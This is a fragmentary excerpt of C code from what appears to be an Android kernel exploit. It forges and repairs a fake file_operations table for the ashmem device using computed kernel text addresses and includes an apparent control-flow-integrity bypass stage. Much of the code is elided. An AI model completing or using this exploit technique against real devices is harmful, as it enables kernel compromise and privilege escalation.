...
int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = get_noop_llseek_addr();
  uint64_t after = 0;
...
int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    ...
    {FOPS_COMPAT_IOCTL_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)},
    {FOPS_MMAP_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)},
    {FOPS_OPEN_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)},
    {FOPS_RELEASE_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)},
    {FOPS_SPLICE_READ_OFF, get_copy_splice_read_addr()},
    {FOPS_SHOW_FDINFO_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)},
  };
...
int try_cfi_stage(void) {
  ...
  uintptr_t misc_fops = get_ashmem_misc_fops_addr();
  uint64_t pre_fops = 0;
